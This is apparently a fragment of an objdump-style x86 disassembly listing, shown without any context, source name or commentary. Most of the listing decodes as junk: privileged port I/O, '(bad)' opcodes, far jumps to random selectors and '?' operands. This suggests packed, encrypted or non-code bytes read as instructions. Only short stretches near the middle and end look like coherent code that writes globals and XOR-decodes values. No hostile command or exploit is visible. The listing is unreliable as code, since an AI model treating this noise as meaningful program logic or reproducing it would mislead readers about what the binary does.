  4041b2:	mov    DWORD PTR [edx],ebp
  4041b4:	int3   
  4041b5:	push   edx
  4041b6:	add    ch,dh
  4041b8:	fmul   st,st(4)
  4041ba:	mov    DWORD PTR [ebp+0x68],ebx
  4041bd:	shl    ecx,cl
  4041bf:	and    dl,bh
  4041c1:	lods   eax,DWORD PTR ss:[esi]
  4041c3:	inc    ebx
  4041c4:	stos   BYTE PTR es:[edi],al
  4041c5:	test   DWORD PTR cs:[ebx+0x2f4e6b3],esi
  4041cc:	sub    al,0xa
  4041ce:	push   esp
  4041cf:	fisub  DWORD PTR ds:0x4d6b5339
  4041d5:	in     al,dx
  4041d6:	fs dec edi
  4041d8:	pop    ecx
  4041d9:	cmp    ah,BYTE PTR [eax+0x78ba6295]
  4041df:	push   0x2db7b42a
  4041e4:	or     esp,edx
  4041e6:	dec    ch
  4041e8:	das    
  4041e9:	and    cl,BYTE PTR [edx-0x78]
  4041ec:	jg     0x404221
  4041ee:	shr    ah,cl
  4041f0:	mov    ah,0xcd
  4041f2:	enter  0xf78,0xa9
  4041f6:	test   DWORD PTR [edi+0x36],esi
  4041f9:	add    al,0x86
  4041fb:	jnp    0x4041dd
  4041fd:	sub    eax,0xb40d9cab
  404202:	out    0x20,al
  404204:	sbb    BYTE PTR [ecx],dl
  404206:	mov    esi,0x1d5967d3
  40420b:	push   ds
  40420c:	daa    
  40420d:	in     eax,dx
  40420e:	cmp    edx,DWORD PTR [esp+eiz*8]
  404211:	in     eax,0xe0
  404213:	out    dx,eax
  404214:	inc    edx
  404215:	push   ds
  404216:	cmp    al,0x19
  404218:	(bad)  
  404219:	cmc    
  40421a:	aad    0xd9
  40421c:	aam    0x2d
  40421e:	inc    esp
  40421f:	add    DWORD PTR [eax+0x0],edi
  404222:	and    ecx,0x3b
  404225:	lea    edx,[eax]
  404227:	std    
  404228:	adc    ch,BYTE PTR [eax+0x2]
  40422b:	repz data16 test BYTE PTR [ebp-0x3a],bl
  404230:	nop
  404231:	fisub  WORD PTR [esp+edi*8]
  404234:	cdq    
  404235:	addr16 or al,0x1d
  404238:	pop    ebx
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fdee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	xorps  xmm2,xmm7
  40425a:	and    DWORD PTR [ecx],ebx
  40425c:	dec    edi
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0xb470707d
  404265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404266:	xchg   ecx,eax
  404267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404268:	xor    al,BYTE PTR [ebp-0x6530cf62]
  40426e:	nop
  40426f:	leave  
  404270:	cwde   
  404271:	cs clc 
  404273:	pop    esi
  404274:	cmp    DWORD PTR [ebx-0x7b],0x672875fd
  40427b:	cwde   
  40427c:	mov    al,dl
  40427e:	fst    DWORD PTR [edx+0x60]
  404281:	cmc    
  404282:	mov    bh,0x5d
  404284:	outs   dx,BYTE PTR ds:[esi]
  404285:	scas   al,BYTE PTR es:[edi]
  404286:	mov    bh,0xc4
  404288:	ret    0x1c81
  40428b:	adc    eax,0x77106d30
  404290:	ss stc 
  404292:	stos   DWORD PTR es:[edi],eax
  404293:	fwait
  404294:	cdq    
  404295:	mov    eax,0x1f589ea3
  40429a:	call   0xae422664
  40429f:	add    al,0xb9
  4042a1:	retf   
  4042a2:	mov    cl,0x38
  4042a4:	xchg   edi,eax
  4042a5:	pop    es
  4042a6:	(bad)  
  4042a7:	xchg   ebx,eax
  4042a8:	cli    
  4042a9:	mov    ebp,DWORD PTR [ebx-0x1f]
  4042ac:	jno    0x40432c
  4042ae:	xchg   edx,eax
  4042af:	std    
  4042b0:	pop    ss
  4042b1:	in     eax,0xfe
  4042b3:	les    ecx,FWORD PTR [ecx+0x14]
  4042b6:	loopne 0x404246
  4042b8:	push   es
  4042b9:	mov    esp,0x1da9e897
  4042be:	div    BYTE PTR [edi-0x6c3ea536]
  4042c4:	cld    
  4042c5:	add    ah,BYTE PTR [esi+0x59cb3b0f]
  4042cb:	jmp    0x40433d
  4042cd:	pop    ss
  4042ce:	mov    esp,0x35ca96b9
  4042d3:	mov    ch,al
  4042d5:	pushf  
  4042d6:	push   esi
  4042d7:	adc    BYTE PTR [ebx],ch
  4042d9:	sbb    al,0x6b
  4042db:	xor    dl,BYTE PTR [ebx-0x9]
  4042de:	dec    eax
  4042df:	test   al,0x26
  4042e1:	pop    eax
  4042e2:	and    esp,ecx
  4042e4:	push   ebx
  4042e5:	inc    BYTE PTR [ecx+0x6d293f9e]
  4042eb:	test   eax,0x33066538
  4042f0:	mov    edi,0x9b37841c
  4042f5:	push   ebp
  4042f6:	(bad)  
  4042f7:	pusha  
  4042f8:	scas   al,BYTE PTR es:[edi]
  4042f9:	mov    bh,0xe1
  4042fb:	es inc esp
  4042fd:	mov    eax,ds:0x6d51e88f
  404302:	in     al,dx
  404303:	xor    dh,BYTE PTR ss:[ebx+0xf]
  404307:	xchg   ebx,eax
  404308:	jmp    0x31e1:0x7e85feb7
  40430f:	dec    edi
  404310:	dec    ebx
  404311:	test   BYTE PTR [ebp-0x25],dh
  404314:	leave  
  404315:	xor    al,0xe4
  404317:	push   esp
  404318:	cld    
  404319:	pop    es
  40431a:	ret    0x9bd0
  40431d:	cmp    edx,DWORD PTR [ebp-0x148ada1d]
  404323:	pop    es
  404324:	call   DWORD PTR [ebx]
  404326:	mov    dl,0xb9
  404328:	push   cs
  404329:	cmp    DWORD PTR [esi],0x882187ba
  40432f:	sbb    eax,0x5218b498
  404334:	jmp    0x4042c3
  404336:	test   al,0x64
  404338:	inc    ebx
  404339:	retf   0xdd01
  40433c:	call   0xdf42:0x302fd6fa
  404343:	out    0x38,al
  404345:	cmp    ah,BYTE PTR [edx-0x23]
  404348:	xchg   ebx,eax
  404349:	ja     0x404312
  40434b:	mov    esi,DWORD PTR ds:0x5f5061e1
  404351:	mov    eax,ds:0x7d46e89c
  404356:	xchg   BYTE PTR [esi],bl
  404358:	clc    
  404359:	xchg   esp,eax
  40435a:	dec    si
  40435c:	pop    ebx
  40435d:	leave  
  40435e:	adc    al,0x82
  404360:	pusha  
  404361:	inc    edx
  404362:	loopne 0x40438b
  404364:	or     eax,0xf420da76
  404369:	mov    ebx,DWORD PTR [ebx+0x19]
  40436c:	adc    edi,edi
  40436e:	cmp    edx,ebx
  404370:	nop
  404371:	lods   al,BYTE PTR ds:[esi]
  404372:	dec    BYTE PTR ds:0x6e07b5d7
  404378:	cld    
  404379:	cdq    
  40437a:	push   eax
  40437b:	loop   0x4042ff
  40437d:	fistp  WORD PTR [edx]
  40437f:	aam    0xe0
  404381:	jp     0x4043b0
  404383:	(bad)  
  404384:	adc    ah,ah
  404386:	xchg   ecx,eax
  404387:	gs push esp
  404389:	cdq    
  40438a:	fsubr  st(0),st
  40438c:	xchg   ebx,eax
  40438d:	retf   
  40438e:	cmp    al,0x5
  404390:	jno    0x40439f
  404392:	or     esp,ebx
  404394:	inc    ebx
  404395:	cmp    dl,BYTE PTR ds:0x5baed95a
  40439b:	xchg   edi,eax
  40439c:	jnp    0x404336
  40439e:	lea    ecx,[ecx-0x72]
  4043a1:	daa    
  4043a2:	fwait
  4043a3:	push   ds
  4043a4:	shr    DWORD PTR [ebp+0x6c],cl
  4043a7:	pop    ss
  4043a8:	gs (bad) 
  4043aa:	fdiv   QWORD PTR [ebp+0x18bd31a1]
  4043b0:	pop    ebp
  4043b1:	xchg   DWORD PTR [eax+0x6d],ebx
  4043b4:	int3   
  4043b5:	lods   al,BYTE PTR ds:[esi]
  4043b6:	test   al,0x68
  4043b8:	xor    al,0x50
  4043ba:	sub    edi,ebx
  4043bc:	push   ebx
  4043bd:	sub    esp,DWORD PTR [ecx-0x3090d5e7]
  4043c3:	fadd   DWORD PTR ds:0xb7c41e9
  4043c9:	inc    ecx
  4043ca:	sub    DWORD PTR [eax-0x62],esi
  4043cd:	jae    0x404376
  4043cf:	lock push eax
  4043d1:	inc    edi
  4043d2:	xchg   DWORD PTR [edx],ebx
  4043d4:	test   eax,0xd54f83d4
  4043d9:	push   cs
  4043da:	push   ebp
  4043db:	push   ds
  4043dc:	(bad)  
  4043dd:	(bad)  
  4043de:	shl    DWORD PTR [edx-0x3c],1
  4043e1:	xchg   ecx,eax
  4043e2:	push   0xffffff89
  4043e4:	ror    BYTE PTR [edi+edi*2],cl
  4043e7:	add    BYTE PTR [esi],cl
  4043e9:	cli    
  4043ea:	mov    esp,0x8d7a3e02
  4043ef:	dec    edx
  4043f0:	nop
  4043f1:	sti    
  4043f2:	push   edx
  4043f3:	mov    cl,0xc4
  4043f5:	(bad)  
  4043f7:	and    eax,0x5566cda
  4043fc:	xchg   ebx,eax
  4043fd:	ret    
  4043fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043ff:	mov    ebx,0x8ffd099f
  404404:	fidivr DWORD PTR [ebp-0x4090e3be]
  40440a:	pop    edi
  40440b:	repnz adc DWORD PTR [esi+0xc],0x1f
  404410:	mov    ch,0xb0
  404412:	inc    esi
  404413:	mov    ch,dh
  404415:	loope  0x4043b3
  404417:	push   edi
  404418:	dec    ebp
  404419:	mov    ch,0x14
  40441b:	dec    ebp
  40441c:	fimul  DWORD PTR [edx+edi*4+0x10]
  404420:	mov    edx,0x6b4059b5
  404425:	imul   edx,DWORD PTR [eax-0xafe50ba],0x73f267ee
  40442f:	shl    DWORD PTR [esi],1
  404431:	dec    cx
  404433:	adc    edx,eax
  404435:	jecxz  0x4043fc
  404437:	fs push cs
  404439:	sbb    DWORD PTR [ebp+0x0],esp
  40443c:	int    0x7f
  40443e:	in     al,dx
  40443f:	sahf   
  404440:	not    DWORD PTR [edx+esi*8+0x67]
  404444:	add    ebp,DWORD PTR [edx]
  404446:	addr16 pop esp
  404448:	xchg   esp,eax
  404449:	inc    ecx
  40444a:	jge    0x4043ff
  40444c:	push   ss
  40444d:	push   ebp
  40444e:	mov    WORD PTR [edx+0x56],cs
  404451:	sub    esi,DWORD PTR [edi-0xa639e7d]
  404457:	mov    al,ds:0x759ce4f
  40445c:	repz mov eax,ds:0x698ed6f7
  404462:	aaa    
  404463:	clc    
  404464:	(bad)  
  404465:	ins    BYTE PTR es:[edi],dx
  404466:	mov    bl,0x76
  404468:	cmp    eax,0x5c1cc004
  40446d:	mov    bl,0xf1
  40446f:	mov    bh,0xe1
  404471:	stc    
  404472:	ret    
  404473:	add    esp,ecx
  404475:	popf   
  404476:	clc    
  404477:	mov    BYTE PTR [ecx],bh
  404479:	cld    
  40447a:	xchg   DWORD PTR [edx],esp
  40447c:	push   edx
  40447d:	push   ecx
  40447e:	jo     0x404447
  404480:	pop    ss
  404481:	loope  0x404420
  404483:	jne    0x404412
  404485:	and    al,0xd5
  404487:	loop   0x404445
  404489:	mov    eax,ds:0x200101a
  40448e:	and    cl,bl
  404490:	mov    al,BYTE PTR [ecx-0x41d52e08]
  404496:	dec    dx
  404498:	push   ecx
  404499:	xchg   DWORD PTR [esi],eax
  40449b:	pop    ebx
  40449c:	dec    DWORD PTR [edi-0x27]
  40449f:	in     al,0xd6
  4044a1:	jmp    0xbba4:0xfe39fc31
  4044a8:	aam    0x9f
  4044aa:	cs aam 0x49
  4044ad:	or     eax,0xc064b708
  4044b2:	in     eax,dx
  4044b3:	sub    DWORD PTR ds:0xfbe84d14,0xffffff8b
  4044ba:	jge    0x4044d6
  4044bc:	xor    al,0x67
  4044be:	in     eax,0x9a
  4044c0:	cmp    BYTE PTR [edi+0x12],al
  4044c3:	push   esi
  4044c4:	fisttp DWORD PTR [edx+ebp*2+0x1b]
  4044c8:	cwde   
  4044c9:	setne  BYTE PTR [edx]
  4044cc:	xchg   ebp,eax
  4044cd:	push   edi
  4044ce:	jae    0x404527
  4044d0:	sub    cl,BYTE PTR [ecx-0x50d3cd3d]
  4044d6:	ficom  WORD PTR [ebp-0x2d]
  4044d9:	xor    BYTE PTR [eax+0x10],al
  4044dc:	js     0x404510
  4044de:	sar    BYTE PTR [edx-0x74d9a29a],0x64
  4044e5:	mov    edx,DWORD PTR [ebp-0x6f]
  4044e8:	aaa    
  4044e9:	and    al,0xeb
  4044eb:	xor    BYTE PTR [ebp-0x12],dh
  4044ee:	mov    DWORD PTR [edi+0x19],0xd60909bc
  4044f5:	push   edi
  4044f6:	ins    BYTE PTR es:[edi],dx
  4044f7:	add    al,0x46
  4044f9:	cdq    
  4044fa:	cmc    
  4044fb:	inc    ebx
  4044fc:	jno    0x4044f7
  4044fe:	add    DWORD PTR [eax-0x3db7080],edi
  404504:	and    DWORD PTR [esi-0x3ca63382],0x7cf1aede
  40450e:	jge    0x4044db
  404510:	daa    
  404511:	xchg   ebx,eax
  404512:	xlat   BYTE PTR ds:[ebx]
  404513:	aas    
  404514:	jecxz  0x4044ec
  404516:	sub    eax,0x64deece1
  40451b:	push   esp
  40451c:	or     DWORD PTR [edx],esp
  40451e:	sbb    eax,0x6bfb90be
  404523:	adc    ah,BYTE PTR [ebp+0x81fdc96]
  404529:	and    ch,al
  40452b:	pop    esp
  40452c:	aaa    
  40452d:	fistp  DWORD PTR [ecx+0xe2a43d1]
  404533:	fisub  WORD PTR [eax]
  404535:	repnz test DWORD PTR [edi-0x2c],0xe240c924
  40453d:	aam    0xf2
  40453f:	dec    ebx
  404540:	jae    0x404539
  404542:	mov    dh,cl
  404544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404545:	jae    0x40458a
  404547:	rcl    cl,1
  404549:	and    ecx,0xffffffb1
  40454c:	jne    0x40453a
  40454e:	(bad)  
  40454f:	dec    ebp
  404550:	out    dx,al
  404551:	cmc    
  404552:	sahf   
  404553:	xor    BYTE PTR [esi+0x2472f5b8],cl
  404559:	ret    
  40455a:	shl    BYTE PTR [eax+0x50],1
  40455d:	data16 icebp 
  40455f:	mov    edi,0xcba25277
  404564:	cld    
  404565:	fisub  DWORD PTR [edi]
  404567:	dec    eax
  404568:	dec    eax
  404569:	or     al,0x3
  40456b:	into   
  40456c:	(bad)  
  40456d:	mov    al,ds:0xac00231
  404572:	jg     0x40451c
  404574:	and    al,0xf8
  404576:	fcmovu st,st(6)
  404578:	repnz sar BYTE PTR [edi],0x9a
  40457c:	add    ah,dh
  40457e:	adc    al,0xc0
  404580:	stc    
  404581:	and    eax,0xaeb6d299
  404586:	xchg   esi,eax
  404587:	popa   
  404588:	sub    eax,0x16c1352f
  40458d:	(bad)  
  40458f:	das    
  404590:	pop    edx
  404591:	sub    al,0xe5
  404593:	cmp    eax,0x7916d0f6
  404598:	lea    ecx,[ebx-0x659c5aee]
  40459e:	sub    esi,DWORD PTR [ebp-0x72]
  4045a1:	ret    
  4045a2:	inc    ebp
  4045a3:	data16 ja 0x40457d
  4045a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fe02,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	clc    
  4045c8:	xor    DWORD PTR [ebp+0x1c],ebp
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xcb70707d
  4045d4:	call   0xe7b0ce62
  4045d9:	sub    eax,0x601f6b6a
  4045de:	psubq  mm3,QWORD PTR [edx]
  4045e1:	sub    esp,DWORD PTR [ecx-0x4a]
  4045e4:	loope  0x40461d
  4045e6:	arpl   WORD PTR [eax-0x75],bp
  4045e9:	mov    esi,0x2264ea7e
  4045ee:	es test eax,0x5bf7e077
  4045f4:	jg     0x4045dc
  4045f6:	scas   eax,DWORD PTR es:[edi]
  4045f7:	mov    al,0xf3
  4045f9:	xor    eax,0xf44355c8
  4045fe:	xchg   esi,eax
  4045ff:	jmp    0x404664
  404601:	adc    al,0x3f
  404603:	es repnz or al,0x34
  404607:	or     eax,0x88fd8a2f
  40460c:	xlat   BYTE PTR ds:[ebx]
  40460d:	aad    0x13
  40460f:	ret    0xe784
  404612:	stos   DWORD PTR es:[edi],eax
  404613:	cmp    BYTE PTR [ebx+0x59dba4bd],bh
  404619:	loopne 0x4045b9
  40461b:	push   ds
  40461c:	mov    ah,0xe7
  40461e:	pushf  
  40461f:	pop    esp
  404620:	je     0x4045cc
  404622:	cmp    eax,0xd25395db
  404627:	arpl   WORD PTR [edi],bp
  404629:	mov    cl,0xe3
  40462b:	cmp    ebx,DWORD PTR [ebp-0x65]
  40462e:	out    0x96,eax
  404630:	xchg   ebx,eax
  404631:	jne    0x4045bb
  404633:	imul   ebp,DWORD PTR [edi+eax*1+0x29a5842b],0x17
  40463b:	xlat   BYTE PTR ds:[ebx]
  40463c:	and    ebx,edi
  40463e:	and    al,0x93
  404640:	jge    0x404670
  404642:	lods   al,BYTE PTR ds:[esi]
  404643:	jae    0x4046b7
  404645:	mov    ?,WORD PTR [ebx+ecx*2+0x44]
  404649:	je     0x4045d3
  40464b:	(bad)  
  40464c:	and    bh,bl
  40464e:	xchg   esi,eax
  40464f:	push   esp
  404650:	push   esp
  404651:	add    BYTE PTR [ebx+ebp*4],ch
  404654:	jnp    0x404648
  404656:	std    
  404657:	arpl   WORD PTR [edi-0x393c96ec],cx
  40465d:	into   
  40465e:	jo     0x40465a
  404660:	bound  ecx,QWORD PTR [edx+0x6df346]
  404666:	add    ch,BYTE PTR [eax-0x77]
  404669:	sub    eax,0x38ca4a42
  40466e:	push   es
  40466f:	out    dx,eax
  404670:	ja     0x404602
  404672:	or     eax,ebp
  404674:	int3   
  404675:	dec    ebx
  404676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404677:	cli    
  404678:	popa   
  404679:	jle    0x40461f
  40467b:	xor    DWORD PTR [ebp+0x42],0xcdb149e3
  404682:	cdq    
  404683:	cmp    esi,DWORD PTR [ebp+0x15]
  404686:	mov    ecx,?
  404688:	cmp    BYTE PTR [esi+0x73175738],al
  40468e:	push   edi
  40468f:	dec    esp
  404690:	xchg   edi,eax
  404691:	icebp  
  404692:	(bad)  
  404693:	jl     0x404690
  404695:	mov    bh,bh
  404697:	push   ss
  404698:	(bad)  
  404699:	cmp    ebp,esi
  40469b:	dec    esp
  40469c:	stc    
  40469d:	or     al,0xf6
  40469f:	pop    ds
  4046a0:	mov    esi,0x63299e4e
  4046a5:	dec    BYTE PTR [ebp+0x18]
  4046a8:	in     al,0x4a
  4046aa:	pop    ecx
  4046ab:	arpl   WORD PTR [edi-0x10],di
  4046ae:	or     ebp,ebx
  4046b0:	shl    edi,0x92
  4046b3:	enter  0x4d4d,0xb7
  4046b7:	pusha  
  4046b8:	mov    BYTE PTR [ecx],al
  4046ba:	mov    ds:0x25ee8a89,eax
  4046bf:	out    0x1e,eax
  4046c1:	ret    0x9033
  4046c4:	push   es
  4046c5:	rcl    eax,0xf5
  4046c8:	jb     0x404734
  4046ca:	push   ss
  4046cb:	dec    ecx
  4046cc:	mov    esi,0xc71339cd
  4046d1:	xchg   ebx,eax
  4046d2:	add    eax,0x4ca780c2
  4046d7:	into   
  4046d8:	into   
  4046d9:	xchg   edx,eax
  4046da:	out    0x34,eax
  4046dc:	cmp    eax,0x4ef4fd32
  4046e1:	aam    0x41
  4046e3:	mov    ch,0x2
  4046e5:	sbb    eax,0x73da09ff
  4046ea:	out    dx,eax
  4046eb:	mov    ebx,0xdbbf1437
  4046f0:	push   edi
  4046f1:	sbb    BYTE PTR gs:[bx+di-0x1925],ch
  4046f7:	fadd   DWORD PTR [edi+0x12]
  4046fa:	xor    bl,BYTE PTR [edx-0x98dfd9a]
  404700:	call   0x6809:0xfc71fd3a
  404707:	pop    ebx
  404708:	and    eax,0x223ecf2a
  40470d:	iret   
  40470e:	dec    edx
  40470f:	xor    eax,0xa41c8a62
  404714:	fwait
  404715:	nop
  404716:	xchg   BYTE PTR [edx],ah
  404718:	push   ebp
  404719:	adc    ah,BYTE PTR [ebp+0xa]
  40471c:	add    al,bh
  40471e:	ud1    ecx,DWORD PTR [ebx+0x77294509]
  404725:	in     eax,dx
  404726:	ror    DWORD PTR cs:[edi+0x56a8c179],0x6
  40472e:	stos   BYTE PTR es:[edi],al
  40472f:	push   ss
  404730:	pop    esi
  404731:	add    BYTE PTR [edx+0x412d4e0d],al
  404737:	inc    eax
  404738:	into   
  404739:	je     0x40470d
  40473b:	test   ch,cl
  40473d:	cwde   
  40473e:	fadd   st(2),st
  404740:	xchg   esp,eax
  404741:	sub    DWORD PTR [ecx+0x28],edx
  404744:	cmc    
  404745:	adc    al,0xa5
  404747:	leave  
  404748:	das    
  404749:	fwait
  40474a:	add    dl,bh
  40474c:	lahf   
  40474d:	xlat   BYTE PTR ds:[ebx]
  40474e:	dec    edi
  40474f:	jb     0x40471b
  404751:	mov    dl,BYTE PTR ds:0x2705c03a
  404757:	je     0x4046df
  404759:	mov    dl,0xed
  40475b:	rcl    DWORD PTR [ebx-0xc],0x75
  40475f:	mov    edx,0x1abf4ff6
  404764:	pop    ebx
  404765:	lea    ebx,[edx-0x78f344e3]
  40476b:	fcmovbe st,st(2)
  40476d:	inc    esp
  40476e:	sub    al,0x44
  404770:	shl    ch,cl
  404772:	add    eax,0xa569ba1d
  404777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404778:	in     al,0x6
  40477a:	xor    ch,BYTE PTR [ecx-0x2211bb04]
  404780:	mov    cl,0x88
  404782:	test   eax,edi
  404784:	push   0x64
  404786:	mov    ah,0xe7
  404788:	out    dx,eax
  404789:	lock xchg esi,eax
  40478b:	in     al,0x65
  40478d:	pop    ebp
  40478e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40478f:	test   eax,0x25955cf2
  404794:	jo     0x404763
  404796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404797:	jmp    0x6e7f8995
  40479c:	xchg   ecx,ecx
  40479e:	hlt    
  40479f:	cmp    DWORD PTR [esi-0x46],0xffffffbd
  4047a3:	cld    
  4047a4:	sub    ah,cl
  4047a6:	xchg   edi,eax
  4047a7:	retf   
  4047a8:	lds    esp,FWORD PTR [edi+0x72]
  4047ab:	push   ds
  4047ac:	nop
  4047ad:	dec    esi
  4047ae:	iret   
  4047af:	ds scas eax,DWORD PTR es:[edi]
  4047b1:	cmp    eax,0xa9b2f9ea
  4047b6:	mov    al,0xa
  4047b8:	bound  edi,QWORD PTR [ecx-0x7d2f59b2]
  4047be:	jp     0x40476e
  4047c0:	push   0x12
  4047c2:	arpl   WORD PTR [esi+0x6],ax
  4047c5:	stos   BYTE PTR es:[edi],al
  4047c6:	ins    DWORD PTR es:[edi],dx
  4047c7:	loope  0x404757
  4047c9:	sahf   
  4047ca:	int    0x29
  4047cc:	stos   DWORD PTR es:[edi],eax
  4047cd:	pusha  
  4047ce:	mov    bh,al
  4047d0:	push   ss
  4047d1:	fstp   DWORD PTR ds:0xa32e60a
  4047d7:	ds pop ebx
  4047d9:	(bad)  [esi]
  4047db:	cmp    DWORD PTR [esi],ebx
  4047dd:	jae    0x4047f7
  4047df:	sbb    al,0xd6
  4047e1:	dec    esp
  4047e2:	shr    bh,cl
  4047e4:	lea    ecx,[eax+0x64]
  4047e7:	scas   eax,DWORD PTR es:[edi]
  4047e8:	jge    0x404795
  4047ea:	(bad)  
  4047eb:	stos   BYTE PTR es:[edi],al
  4047ec:	or     BYTE PTR [eax],0x1f
  4047ef:	sahf   
  4047f0:	add    edx,0x6c
  4047f3:	cmp    DWORD PTR [ecx-0x67998cdb],esp
  4047f9:	not    BYTE PTR [ebp+0x4e02869d]
  4047ff:	push   edi
  404800:	xchg   edi,eax
  404801:	mov    ebx,0x19a950e
  404806:	push   ss
  404807:	(bad)  
  404808:	leave  
  404809:	or     DWORD PTR [ebx],ecx
  40480b:	lds    esi,FWORD PTR [ebx+0x7c]
  40480e:	imul   edi,DWORD PTR [edx+0x202a23fc],0xffffff97
  404815:	scas   eax,DWORD PTR es:[edi]
  404816:	sbb    al,BYTE PTR [ecx+0x15]
  404819:	jae    0x4047d6
  40481b:	mov    eax,ebp
  40481d:	push   0x4da62c20
  404822:	imul   eax,DWORD PTR ds:0x3d4af4d6,0xf2eb8c39
  40482c:	xor    edi,DWORD PTR [edx]
  40482e:	inc    eax
  40482f:	(bad)
  404834:	sub    eax,0xd10eb676
  404839:	sub    dl,BYTE PTR [ebx-0x1b]
  40483c:	cmp    al,0x9c
  40483e:	pop    ss
  40483f:	gs pop ss
  404841:	inc    edi
  404842:	mov    al,0xdc
  404844:	pop    edi
  404845:	popf   
  404846:	dec    ebp
  404847:	outs   dx,DWORD PTR ds:[esi]
  404848:	push   es
  404849:	js     0x4047cb
  40484b:	inc    edi
  40484c:	aas    
  40484d:	cmp    dh,BYTE PTR [ebx]
  40484f:	test   DWORD PTR [ebx],ecx
  404851:	sti    
  404852:	sti    
  404853:	dec    ebp
  404854:	pop    ecx
  404855:	(bad)  
  404856:	xlat   BYTE PTR ds:[ebx]
  404857:	leave  
  404858:	stos   BYTE PTR es:[edi],al
  404859:	mov    edx,0x6f50b0d5
  40485e:	add    eax,0x7fbdc034
  404863:	mov    eax,ds:0xd13e603c
  404868:	jl     0x404811
  40486a:	dec    esi
  40486b:	inc    esi
  40486c:	mov    ebx,0x3b24e8ba
  404871:	mov    al,0x89
  404873:	aas    
  404874:	push   es
  404875:	int    0x50
  404877:	in     al,dx
  404878:	arpl   WORD PTR [eax],ax
  40487a:	das    
  40487b:	xchg   esi,eax
  40487c:	dec    esp
  40487d:	xchg   ebp,eax
  40487e:	push   cs
  40487f:	xchg   ebp,eax
  404880:	mov    cl,0xf7
  404882:	xlat   BYTE PTR ds:[ebx]
  404883:	in     eax,dx
  404884:	data16 jl 0x40480a
  404887:	test   al,0xaf
  404889:	test   BYTE PTR [esi+0xd],dh
  40488c:	or     al,BYTE PTR [esi+0x49d9ccfd]
  404892:	hlt    
  404893:	das    
  404894:	adc    BYTE PTR [ecx-0x3d],bh
  404897:	ins    DWORD PTR es:[edi],dx
  404898:	jl     0x40484b
  40489a:	dec    eax
  40489b:	(bad)  
  40489d:	push   es
  40489e:	pop    ebx
  40489f:	xor    BYTE PTR [esi+ebp*4+0x3f],dl
  4048a3:	jle    0x40483a
  4048a5:	mov    bl,0x89
  4048a7:	test   eax,0x6b0d822b
  4048ac:	ss out 0xe5,eax
  4048af:	pop    edx
  4048b0:	mov    eax,0xffe52865
  4048b5:	jo     0x40488e
  4048b7:	(bad)  
  4048b8:	(bad)  [edi]
  4048ba:	cmp    ebx,ebp
  4048bc:	add    al,BYTE PTR cs:[ebp+0x6f19f731]
  4048c3:	mov    DWORD PTR [edx-0x323710b8],0x46aa9c7a
  4048cd:	popa   
  4048ce:	ret    0x7020
  4048d1:	popf   
  4048d2:	and    eax,0xf1c02197
  4048d7:	xchg   edi,eax
  4048d8:	inc    ebx
  4048d9:	inc    esi
  4048da:	mul    BYTE PTR [esi+edx*8]
  4048dd:	mov    dh,0xe0
  4048df:	pop    edx
  4048e0:	cs xor al,0xff
  4048e3:	test   al,0xb4
  4048e5:	xchg   edi,eax
  4048e6:	fnstsw WORD PTR [ebp-0x71]
  4048e9:	pop    ebx
  4048ea:	add    dh,BYTE PTR [ecx+0x49]
  4048ed:	mov    ecx,0x35a7c24b
  4048f2:	test   BYTE PTR [esi+0x3e],0x51
  4048f6:	and    eax,0x5a7c94e6
  4048fb:	aam    0x0
  4048fd:	mov    edx,0x24b9c1ea
  404902:	mov    edx,0x83e65176
  404907:	or     DWORD PTR [eax],esp
  404909:	pop    esp
  40490a:	test   ah,ch
  40490c:	mov    ds:0xe59ff261,al
  404911:	ins    BYTE PTR es:[edi],dx
  404912:	stos   DWORD PTR es:[edi],eax
  404913:	bound  edx,QWORD PTR [ecx+edi*2+0x33f4458b]
  40491a:	rol    DWORD PTR [ebx],1
  40491c:	(bad)  
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e19c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e1a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e77f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e1b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd85,0x42e1b4
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fdfa,0x42fd79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fdfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e783,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe02,0x42fdfe
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e787,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
